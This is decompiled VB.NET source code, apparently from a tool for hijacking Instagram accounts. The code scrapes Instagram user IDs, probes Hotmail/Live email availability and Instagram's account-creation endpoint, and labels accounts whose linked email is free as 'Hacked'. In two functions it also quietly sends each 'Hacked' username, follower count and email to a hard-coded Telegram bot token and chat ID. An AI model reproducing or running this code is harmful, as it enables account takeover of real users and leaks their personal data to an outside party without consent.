            Dim array4 As String() = CType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GClass0.smethod_4(text2)))))))))))))))), String())
            text = array4(1)
            If flag Then
            End If
            value = Conversions.ToBoolean(array4(0))
        Catch ex As Exception
            Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
        End Try
IL_17A:
        Return New String() {Conversions.ToString(value), text}
    End Function
    Public Sub get_hotmail_list(list_1 As List(Of String))
        Try
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.get_Hotmail(list_1(2))))))))))))))))))
            If Not Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(objectValue, New Object() {0}, Nothing), True, False) Then
                Dim text As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Not Hacked", NewLateBinding.LateIndexGet(objectValue, New Object() {1}, Nothing).ToString(), vbCrLf & "=========================" & vbCrLf})
                Me.TextBox2.AppendText(text)
                Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel2
                Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
                toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                If Me.CheckBox4.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Taken ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox2.Text)
                End If
            Else
                Dim text2 As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Hacked" & vbCrLf & "=========================" & vbCrLf})
                Me.TextBox3.AppendText(text2)
                Dim s As String = " " + vbCrLf & "This For You!"
                Dim ss As String = " " + vbCrLf & "Username : " + list_1(0)
                Dim sss As String = " " + vbCrLf & "Followers : " + list_1(1)
                Dim ssss As String = " " + vbCrLf & "Email : " + list_1(2)
                Dim sssss As String = " " + vbCrLf & "Status: Hacked"
                Dim ssssss As String = " " + vbCrLf & "_________"
                Try
                    Dim txt As String = New WebClient().DownloadString("https://api.telegram.org/bot1051838588:AAE009v4i2YC40SQXO5vusCXOERvpkvZmg8/sendMessage?chat_id=947791001&text=" + s + ss + sss + ssss + sssss + ssssss)
                Catch bk As Exception
                End Try
                Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
                Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
                ToolStripStatusLabel14.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
                If Me.CheckBox1.Checked AndAlso Me.CheckBox3.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Hacked ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox3.Text)
                End If
            End If
        Catch ex As WebException
            Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
            Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
            ToolStripStatusLabel4.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
            Thread.Sleep(15000)
        End Try
    End Sub


    Public Function get_Hotmail_live(string_5 As String) As String()
        Dim value As Boolean = False
        Dim text As String = ""
        Dim text2 As String = string_5.ToString().ToLower()
        Dim flag As Boolean = False
        If text2.Contains("+") Then
            flag = True
            Dim text3 As String = text2
            Dim array As String() = text3.Split(New Char() {"+"c})
            Dim array2 As String() = array(1).Split(New Char() {"@"c})
            Dim text4 As String = array(0).ToString() + "@" + array2(1).ToString()
            text2 = text4
        End If
        Try
            If text2.Contains("@live.") Then
                If text2.Contains("_") Then
                    value = True
                    GoTo IL_17A
                End If
                Dim array3 As String() = text2.Split(New Char() {"@"c})
                If array3(0).Length < 6 Then
                    value = True
                    GoTo IL_17A
                End If
            End If
            Dim array4 As String() = CType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(GClass0.smethod_4(text2)))))))))))))))), String())
            text = array4(1)
            If flag Then
            End If
            value = Conversions.ToBoolean(array4(0))
        Catch ex As Exception
            Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
        End Try
IL_17A:
        Return New String() {Conversions.ToString(value), text}
    End Function
    Public Sub get_hotmail_live_list(list_1 As List(Of String))
        Try
            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.get_Hotmail_live(list_1(2))))))))))))))))))
            If Not Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(objectValue, New Object() {0}, Nothing), True, False) Then
                Dim text As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Not Hacked", NewLateBinding.LateIndexGet(objectValue, New Object() {1}, Nothing).ToString(), vbCrLf & "=========================" & vbCrLf})
                Me.TextBox2.AppendText(text)
                Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel2
                Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
                toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                If Me.CheckBox4.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Taken ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox2.Text)
                End If
            Else
                Dim text2 As String = String.Concat(New String() {"Username : ", list_1(0), vbCrLf & "Followers : ", list_1(1), vbCrLf & "Email : ", list_1(2), vbCrLf & "Status: Hacked" & vbCrLf & "=========================" & vbCrLf})
                Me.TextBox3.AppendText(text2)
                Dim s As String = " " + vbCrLf & "This For You!"
                Dim ss As String = " " + vbCrLf & "Username : " + list_1(0)
                Dim sss As String = " " + vbCrLf & "Followers : " + list_1(1)
                Dim ssss As String = " " + vbCrLf & "Email : " + list_1(2)
                Dim sssss As String = " " + vbCrLf & "Status: Hacked"
                Dim ssssss As String = " " + vbCrLf & "_________"
                Try
                    Dim txt As String = New WebClient().DownloadString("https://api.telegram.org/bot1051838588:AAE009v4i2YC40SQXO5vusCXOERvpkvZmg8/sendMessage?chat_id=947791001&text=" + s + ss + sss + ssss + sssss + ssssss)
                Catch bk As Exception
                End Try
                Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
                Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
                ToolStripStatusLabel14.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
                If Me.CheckBox1.Checked AndAlso Me.CheckBox3.Checked Then
                    File.WriteAllText(String.Concat(New String() {Application.StartupPath, "\Hacked ", Me.string_0, " (", Me.TextBox1.Text, ").txt"}), Me.TextBox3.Text)
                End If
            End If
        Catch ex As WebException
            Dim ToolStripStatusLabel14 As ToolStripStatusLabel = Me.ToolStripStatusLabel13
            Dim ToolStripStatusLabel13 As ToolStripStatusLabel = ToolStripStatusLabel14
            ToolStripStatusLabel4.Text = Conversions.ToString(Conversions.ToDouble(ToolStripStatusLabel13.Text) + 1.0)
            Thread.Sleep(15000)
        End Try
    End Sub
    Public Function method_5(string_5 As String) As Object
        Dim list As List(Of String) = New List(Of String)()
        Try
            Dim webRequest As WebRequest = WebRequest.Create("https://www.instagram.com/web/search/topsearch/?context=blended&query=""" + string_5 + """&max_id=endcursor")
            webRequest.Method = "GET"
            webRequest.Proxy = Nothing
            Dim response As WebResponse = webRequest.GetResponse()
            Dim responseStream As Stream = response.GetResponseStream()
            Dim streamReader As StreamReader = New StreamReader(responseStream)
            Dim text As String = streamReader.ReadToEnd()
            Dim text2 As String = "%22pk%22%3A+%22%5B0-9%5D%5Cw%2B%22"
            text2 = WebUtility.UrlDecode(text2)
            Dim matchCollection As MatchCollection = Nothing
            Try
                Dim regex As Regex = New Regex(text2)
                matchCollection = regex.Matches(text.ToString())
            Catch ex As Exception
            End Try
            Try
                For Each obj As Object In matchCollection
                    Dim match As Match = CType(obj, Match)
                    Dim text3 As String = match.Value
                    text3 = text3.Replace(WebUtility.UrlDecode("%22pk%22%3A+%22"), "")
                    text3 = text3.Replace(WebUtility.UrlDecode("%22"), "")
                    list.Add(text3)
                Next
            Finally
                Dim enumerator As IEnumerator
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        Catch ex2 As Exception
        End Try
        Return list
    End Function
    Public Sub method_6()
        Dim array As String()
        Using Me.openFileDialog_0
            array = File.ReadAllLines(Me.openFileDialog_0.FileName)
        End Using
        Try
            For Each item As String In array
                Me.list_0.Add(item)
            Next
            Me.Label2.Text = "Users : " + Me.list_0.Count.ToString()
            If Me.CheckBox3.Checked Then
                Me.bool_0 = True
            End If
        Catch ex As Exception
        End Try
        Me.thread_1.Abort()
    End Sub
    Public Sub method_7(string_5 As String)
        If Me.list_0.Count < 1 OrElse Not Me.bool_0 Then
            Dim text As String = ""
            Try
                Using httpRequest As HttpRequest = New HttpRequest()
                    httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
                    httpRequest.Cookies = New CookieDictionary(False)
                    httpRequest.IgnoreProtocolErrors = True
                    httpRequest.KeepAlive = True
                    text = httpRequest.[Get]("https://www.instagram.com/web/search/topsearch/?context=blended&query=""" + string_5 + """&count=" + Me.TextBox5.Text, Nothing).ToString()
                End Using
                Dim text2 As String = "%22pk%22%3A+%22%5B0-9%5D%5Cw%2B%22"
                text2 = WebUtility.UrlDecode(text2)
                Dim matchCollection As MatchCollection = Nothing
                Try
                    Dim regex As Regex = New Regex(text2)
                    matchCollection = regex.Matches(text.ToString())
                Catch ex As Exception
                End Try
                Try
                    For Each obj As Object In matchCollection
                        Dim match As Match = CType(obj, Match)
                        Dim text3 As String = match.Value
                        text3 = text3.Replace(WebUtility.UrlDecode("%22pk%22%3A+%22"), "")
                        text3 = text3.Replace(WebUtility.UrlDecode("%22"), "")
                        Me.list_0.Add(text3)
                    Next
                Finally
                    Dim enumerator As IEnumerator
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            Catch ex2 As WebException
                Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
                Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
                toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
            End Try
        End If
        Me.Label2.Text = "Users : " + Conversions.ToString(Conversions.ToDouble(Me.list_0.Count.ToString()) + 1.0)
        Try
            For Each parameter As String In Me.list_0
                Thread.Sleep(Conversions.ToInteger(Me.TextBox4.Text))
                Try
                    Dim thread As Thread = New Thread(AddressOf Me.method_22)
                    thread.Start(parameter)
                Catch ex3 As Exception
                    Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel5
                    Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
                    toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                End Try
            Next
        Finally
            Dim enumerator2 As List(Of String).Enumerator
            CType(enumerator2, IDisposable).Dispose()
        End Try
    End Sub
    Public Sub method_8(string_5 As String)
        Thread.Sleep(10000)
        Dim list As List(Of String) = New List(Of String)()
        Try
            Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create("https://i.instagram.com/api/v1/discover/chaining/?target_id=" + string_5), HttpWebRequest)
            httpWebRequest.Method = "GET"
            httpWebRequest.Host = "i.instagram.com"
            httpWebRequest.UserAgent = "Instagram 5.0.7 Android"
            httpWebRequest.Headers.Add("Accept-Language", "ar;q=1, en;q=0.9")
            httpWebRequest.Headers.Add("X-FB-HTTP-Engine", "Liger")
            httpWebRequest.KeepAlive = True
            httpWebRequest.Proxy = Nothing
            httpWebRequest.CookieContainer = GClass0.cookieContainer_0
            Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
            Dim streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
            Dim text As String = streamReader.ReadToEnd()
            Dim text2 As String = "%22pk%22%3A+%5B0-9%5D%5Cw%2B%2C"
            text2 = WebUtility.UrlDecode(text2)
            Dim matchCollection As MatchCollection = Nothing
            Try
                Dim regex As Regex = New Regex(text2)
                matchCollection = regex.Matches(text.ToString())
            Catch ex As Exception
            End Try
            Try
                For Each obj As Object In matchCollection
                    Dim match As Match = CType(obj, Match)
                    Dim text3 As String = match.Value
                    text3 = text3.Replace(",", "")
                    text3 = text3.Replace(WebUtility.UrlDecode("%22pk%22%3A+"), "")
                    list.Add(text3)
                Next
            Finally
                Dim enumerator As IEnumerator
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        Catch ex2 As Exception
            Thread.Sleep(30000)
            Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
        End Try
        Me.Label3.Text = "SubUsers : " + list.Count.ToString()
        Thread.Sleep(10000)
        Try
            For Each parameter As String In list
                Thread.Sleep(15000)
                Try
                    Threading.Thread.Sleep(20000)
                    Dim thread As Thread = New Thread(AddressOf Me.method_23)
                    thread.Start(parameter)
                Catch ex3 As Exception
                    Thread.Sleep(15000)
                    Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel5
                    Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
                    toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
                End Try
            Next
        Finally
            Dim enumerator2 As List(Of String).Enumerator
            CType(enumerator2, IDisposable).Dispose()
        End Try
    End Sub
    Public Sub method_9(list_1 As List(Of String))
        Thread.Sleep(5000)
        Try
            Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create("https://i.instagram.com/accounts/web_create_ajax/"), HttpWebRequest)
            Dim s As String = "email= " + list_1(2).ToString() + " &enc_password=#PWD_INSTAGRAM_BROWSER:0:2020617:&username=&first_name="
            Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
            httpWebRequest.Method = "POST"
            httpWebRequest.ContentType = "application/x-www-form-urlencoded"
            httpWebRequest.Headers.Add("X-CSRFToken", "4d1RHxO1YEYiEBys2mR28DEWDlbVN1yl")
            httpWebRequest.Headers.Add("X-Instagram-AJAX", "1")
            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest")
            httpWebRequest.Headers.Add("Cookie", "WJkTmQAEAAGn68zqWCbzME-KwV6n; js_datr=JbBhWCXpCLhu_i0Hy89QBFIG; csrftoken=4d1RHxO1YEYiEBys2mR28DEWDlbVN1yl; ig_pr=1.25; ig_vw=1525; ig_dru_dismiss=1485866364904; ig_aib_du=1487800189834; js_reg_ext_ref=http%3A%2F%2Fhelp.instagram.com; js_reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2Fhelp%2Finstagram%2Fcontact%2F1652567838289083; js_reg_fb_gate=https%3A%2F%2Fwww.facebook.com%2Fhelp%2Finstagram%2F292478487812558; wd=1525x724; dpr=1.25")
            httpWebRequest.Referer = "https://i.instagram.com/accounts/login/ajax/"
            httpWebRequest.ContentLength = CLng(bytes.Length)
            Dim requestStream As Stream = httpWebRequest.GetRequestStream()
            requestStream.Write(bytes, 0, bytes.Length)
            requestStream.Close()
            Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
            Dim streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
            Dim text As String = streamReader.ReadToEnd()
            If Not text.Contains("email_is_taken") Then
                Thread.Sleep(5000)
                Dim toolStripStatusLabel As ToolStripStatusLabel = Me.ToolStripStatusLabel10
                Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel
                toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
            Else
                Dim thread As Thread = New Thread(AddressOf Me.method_24)
                thread.Start(list_1)
            End If
            Thread.Sleep(Conversions.ToInteger(Me.TextBox4.Text))
        Catch ex As Exception
            Dim toolStripStatusLabel3 As ToolStripStatusLabel = Me.ToolStripStatusLabel5
            Dim toolStripStatusLabel2 As ToolStripStatusLabel = toolStripStatusLabel3
            toolStripStatusLabel3.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel2.Text) + 1.0)
            Thread.Sleep(30000)
        End Try
    End Sub

    Private Sub LoginButton_Click(sender As Object, e As EventArgs) Handles loginButton.Click
        If Operators.CompareString(Me.loginUsername.Text, Nothing, False) <> 0 AndAlso Operators.CompareString(Me.loginPassword.Text, Nothing, False) <> 0 Then
            If Not Me.bool_6 Then
                If Not Me.bool_6 Then
                    Me.loginButton.Text = "Logging..."
                    Me.loginButton.Enabled = False
                    Dim thread As Thread = New Thread(AddressOf Me.method_14)
                    thread.Start()
                End If
            Else
                Me.loginButton.Enabled = False
                Dim thread2 As Thread = New Thread(AddressOf Me.method_13)
                thread2.Start()
            End If
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        OpenFileDialog1.FileName = ""
        OpenFileDialog1.Filter = "TXT file|*.txt"
        If OpenFileDialog1.ShowDialog() = DialogResult.OK Then
            Dim list() As String = File.ReadAllLines(OpenFileDialog1.FileName)
            list_0.AddRange(list)
            Me.Label2.Text = "Users : " + Me.list_0.Count.ToString()
        End If
    End Sub

    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged

    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged

    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged

    End Sub

    Private Sub TextBox9_TextChanged(sender As Object, e As EventArgs)

    End Sub
End Class
